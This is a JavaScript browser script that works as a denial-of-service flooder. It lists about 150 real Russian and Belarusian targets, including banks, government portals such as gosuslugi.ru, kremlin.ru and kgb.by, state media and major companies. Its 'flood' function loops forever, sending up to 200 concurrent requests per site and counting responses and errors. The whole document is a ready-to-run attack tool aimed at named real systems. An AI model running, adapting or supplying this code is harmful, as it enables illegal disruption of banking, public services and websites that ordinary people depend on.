function runScript() {
        var targets = {
            'https://absolutbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.avangard.ru/rus/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.avtogradbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.autokreditbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.agroros.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ai-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bank.yandex.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.ak-bars.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aksonbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aktivbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.akcia-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.alexbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.alefbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://albank.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://altbb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://capitalbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://alfabank.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.atb.su/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.andjibank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.mfk-bank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aresbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bank-arzamas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.aspectbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://assotsiatsiyabank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://baikalrosbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://byrich.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://norvikbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.zemsky.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.unicreditbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.open.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.raiffeisen.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://abr.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazeta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kp.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://riafan.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://pikabu.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kommersant.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://yaplakal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rbc.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bezformata.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nangs.org': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ya.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://omk.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mos.ru/uslugi': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://mil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://customs.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://pfr.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://iz.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ukraina.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprom.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://magnit.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nornickel.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.surgutneftegas.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tatneft.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://nlmk.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sibur.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.severstal.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.metalloinvest.com': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tmk-group.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.eurosib.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sberbank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.vtb.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gazprombank.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.gosuslugi.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://government.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nalog.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://newletters.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://20.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://constitution.kremlin.ru': { number_of_requests: 0, number_of_errored_responses: 0 },            
            'http://belres.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://belta.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://www.ctv.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://www.mil.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarus24.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://alfaradio.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://www.kgb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.sb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://sputnik.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rec.gov.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiomir.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiostalica.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://radiobrestfm.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tvrmogilev.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://minsknews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://zarya.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://grodnonews.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.tvr.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://yandex.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://belarusbank.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.nbrb.by': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://brrb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.belapb.by/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://bankdabrabyt.by/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://mail.rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://cloud.rkn.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://mvd.gov.ru': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://pwd.wto.economy.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://stroi.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
            'https://proverki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
       }

        var statsEl = document.getElementById('stats');
        function printStats() {
            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
        }
        setInterval(printStats, 100);

        var CONCURRENCY_LIMIT = 200
        var queue = []

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function flood(target) {
            while (true) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift()
                }
                queue.push(
                    fetchWithTimeout(target, { timeout: 600 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            targets[target].number_of_errored_responses++;
                            targets[target].error_message = error.message
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                targets[target].number_of_errored_responses++;
                                targets[target].error_message = response.statusText
                            }
                            targets[target].number_of_requests++;
                        })


                )
            }
        }

        //Start
        Object.keys(targets).map(flood)
}
